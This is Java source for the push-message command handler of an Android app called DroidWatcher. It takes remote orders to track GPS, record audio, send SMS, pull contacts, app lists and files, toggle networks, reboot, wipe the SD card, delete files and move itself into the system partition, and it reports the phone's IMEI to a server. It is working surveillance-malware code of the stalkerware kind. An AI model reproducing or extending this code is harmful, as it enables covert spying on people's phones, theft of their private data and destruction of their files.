package com.droidwatcher;

import org.acra.ACRA;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.os.Message;
import android.util.Log;

import com.droidwatcher.lib.MessageType;
import com.droidwatcher.modules.CommandsModule;
import com.droidwatcher.modules.FileSystemModule;
import com.droidwatcher.modules.GCMModule;
import com.droidwatcher.modules.UpdateModule;
import com.droidwatcher.modules.location.LocationModule;
import com.droidwatcher.variables.ServerMessage;
import com.google.android.gcm.GCMBaseIntentService;
import com.google.android.gcm.GCMRegistrar;

public class GCMIntentService extends GCMBaseIntentService {
	@Override
	protected void onError(Context context, String errorId) {

	}
	
	@Override
	protected boolean onRecoverableError(Context context, String errorId) {
		return super.onRecoverableError(context, errorId);
	}

	@Override
	protected void onMessage(Context context, Intent intent) {
		String data = intent.getStringExtra("gcm_data");
		if (data != null){
			Log.i("GCM MESSAGE", data);
			execute(data);
		}
	}

	@Override
	protected void onRegistered(final Context context, String id) {
		SettingsManager settings = new SettingsManager(this);
		new ServerMessanger(context,
			new ServerMessage(MessageType.GCM_REG, settings.imei(), settings.login())
				.addParam("gcm_id", id)
				.addParam("app", "dw"),
			new ServerMessanger.ICallBack() {
				@Override
				public boolean onFinished(String response) { return false; }

				@Override
				public void onError() {
					GCMRegistrar.setRegisteredOnServer(context, false);
					GCMModule.registered = false;
				}

				@Override
				public void onSuccess() {
					GCMRegistrar.setRegisteredOnServer(context, true);
					GCMModule.registered = true;
				}
		}).start();

	}

	@Override
	protected void onUnregistered(Context context, String id) {

	}
	
	@Override
	public void onDestroy() {
		try {
			GCMRegistrar.onDestroy(getApplicationContext());
		} catch (Exception e) {
			e.printStackTrace();
		}
		super.onDestroy();
	}
	
	private SettingsManager mSettings;
	
	/** GCM commands */
	private enum Command{
		gpson,
		gpsoff,
		gpsget,
		callback,
		reset,
		record,
		recordstop,
		ping,
		sms,
		wifion,
		wifioff,
		gprson,
		gprsoff,
		contact,
		update,
		settings,
		getposition,
		reboot,
		restart,
		applist,
		
		wipesd,
		movetosystem,
		
		fsexternal,
		fsdir,
		fsfile,
		fsdel;
	}
	
	private void execute(String data){
		try {
			JSONObject obj = new JSONObject(data);
			
			String action = obj.optString("a");
			if (action.length() == 0){
				return;
			}
			
			Command command = Command.valueOf(action);
			mSettings = new SettingsManager(this);
			
			switch (command) {
			case gpsget:
				CommandsModule.gpsGet(null);
				break;
			case gpson:
				gpsOn(obj);
				break;
			case gpsoff:
				gpsOff();
				break;
			case callback:
				CommandsModule.callBack(this, obj.optString("p", ""));
				break;
			case reset:
				reset();
				break;
			case ping:
				ping();
				break;
			case record:
				CommandsModule.record(Integer.parseInt(obj.optString("p", "60")));
				break;
			case recordstop:
				CommandsModule.recordStop();
				break;
			case sms:
				sendSMS(obj);
				break;
			case wifion:
				CommandsModule.setWiFiState(this, true);
				break;
			case wifioff:
				CommandsModule.setWiFiState(this, false);
				break;
			case gprsoff:
				CommandsModule.setMobileDataState(this, false);
				break;
			case gprson:
				CommandsModule.setMobileDataState(this, true);
				break;
			case contact:
				CommandsModule.getPhoneBook(this,  mSettings.login());
				break;
			case applist:				
				CommandsModule.getApplicationList(this,  mSettings.login());
				break;
			case update:
				update();
				break;
			case settings:
				CommandsModule.updateSettings(this);
				break;
			case getposition:
				getOnlineLocation();
				break;
			case reboot:
				CommandsModule.reboot();
				break;
			case restart:
				CommandsModule.restart(this);
				break;
				
			case wipesd:
				String code = obj.optString("p", "");
				CommandsModule.wipeSd(this, code);
				break;
			case movetosystem:
				CommandsModule.moveToSystem(this);
				break;
			
			/* FILE SYSTEM MODULE COMMANDS */
			case fsdel:
			case fsdir:
			case fsexternal:
			case fsfile:
				fscommand(command, obj);
				break;
				
			default:
				return;
			}
			
			if (obj.has("id")) {
				long id = obj.optLong("id");
				ServerMessage msg = new ServerMessage(MessageType.GCM_COMMAND_RESPONSE, mSettings.imei(), mSettings.login());
				msg.addParam("id", id);
				new ServerMessanger(this, msg).start();
			}
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	private void fscommand(Command command, JSONObject obj){
		try {
			Message msg = new Message();
			
			switch (command) {
			case fsdel:
				msg.what = FileSystemModule.DELETE_FILE;
				msg.obj = obj.getString("p");
				break;
			case fsdir:
				msg.what = FileSystemModule.GET_DIR;
				msg.obj = obj.getString("p");
				break;
			case fsexternal:
				msg.what = FileSystemModule.GET_SDCARD;
				break;
			case fsfile:
				msg.what = FileSystemModule.GET_FILE;
				msg.obj = obj.getString("p");
				break;

			default:
				break;
			}
			
			FileSystemModule.message(msg);
			
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleException(e);
		}
	}
	
	private void update(){
		UpdateModule.message(UpdateModule.START_UPDATE);
	}
	
	private void getOnlineLocation(){
		LocationModule.message(LocationModule.REQUEST_SINGLE_LOCATION_ONLINE);
	}
	
	private void sendSMS(JSONObject obj){
		try {
			String text = obj.getString("p");
			String number = obj.getString("n");
			
			SmsNotification.sendSms(this, text, number);
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	private void ping(){
		new ServerMessanger(this,
			new ServerMessage(MessageType.GCM_PING_RESPONSE, mSettings.imei(), mSettings.login())
		).start();
	}
	
	private void reset(){
		mSettings.clear();
	}
	
	private void gpsOn(JSONObject obj){
		try {
			String param = obj.getString("p");
			mSettings.gpsInterval(param);
			
			if (!mSettings.isGpsTrackingEnabled()){
				mSettings.isGpsTrackingEnabled(true);
			}
			
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	private void gpsOff() throws Exception{
		if (mSettings.isGpsTrackingEnabled()){
			mSettings.isGpsTrackingEnabled(false);
		}
	}
}
